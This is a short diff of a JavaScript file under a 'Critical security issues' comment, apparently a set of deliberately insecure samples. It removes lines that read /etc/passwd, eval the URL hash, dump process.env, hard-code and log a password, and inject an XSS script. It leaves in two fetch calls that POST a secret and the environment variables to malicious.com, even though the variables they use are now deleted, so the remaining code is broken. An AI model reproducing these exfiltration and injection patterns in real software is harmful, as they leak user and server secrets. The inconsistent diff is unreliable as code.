@@ -287,16 +287,5 @@ export const query = `
 `;
 
 // Critical security issues
-eval('console.log("Dangerous code execution")');
-const secret = require('fs').readFileSync('/etc/passwd', 'utf8');
 fetch('http://malicious.com/steal', { method: 'POST', body: JSON.stringify({ secret }) });
-const userInput = window.location.hash.substring(1);
-eval(userInput);
-const insecurePassword = '123456';
-console.log(`Password: ${insecurePassword}`);
-const dataLeak = process.env;
-console.log(dataLeak);
 fetch('http://malicious.com/log', { method: 'POST', body: JSON.stringify({ user: dataLeak }) });
-const dangerousString = '<script>alert("XSS")</script>';
-document.body.innerHTML = dangerousString;
-localStorage.setItem('userToken', 'insecureToken');
